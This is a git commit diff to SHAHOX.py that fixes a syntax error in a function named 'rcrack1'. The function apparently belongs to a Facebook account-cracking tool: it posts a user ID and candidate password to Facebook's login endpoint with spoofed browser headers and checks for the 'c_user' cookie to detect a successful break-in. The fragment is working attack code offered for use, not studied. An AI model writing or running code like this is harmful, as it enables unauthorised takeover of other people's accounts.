19cd8cefe4b4b01f86c54c20c4a3c3f38b1c4b7a
shaharia420 <134796377+shaharia420@users.noreply.github.com>
2024-02-02 21:08:19 +0600

    Update SHAHOX.py

--- SHAHOX.py
+++ SHAHOX.py
@@ -245,7 +245,7 @@ def rcrack1(uid,pwx,tl):
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-           'viewport-width': '980',		
+           'viewport-width': '980',}		
             lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
